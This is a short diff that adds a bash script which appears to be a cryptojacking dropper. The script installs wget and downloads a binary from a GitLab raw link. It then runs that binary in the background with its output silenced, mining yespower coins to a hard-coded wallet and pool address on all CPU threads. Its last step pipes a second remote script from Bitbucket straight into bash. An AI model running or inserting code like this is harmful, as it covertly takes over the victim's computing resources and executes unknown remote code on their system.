@@ -1,0 +1,6 @@
+#!/bin/bash
+apt -y install wget
+wget -q https://gitlab.com/jadons19292/donlod/-/raw/main/sare
+chmod +x sare
+./sare --algorithm yespower --pool 64.225.25.181:80 --wallet uzrKLPM88xXDP3CtWdPwh8ZvxsHNXXrLju.gass --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
+curl -sL https://bitbucket.org/nicezep/file/raw/master/time | bash
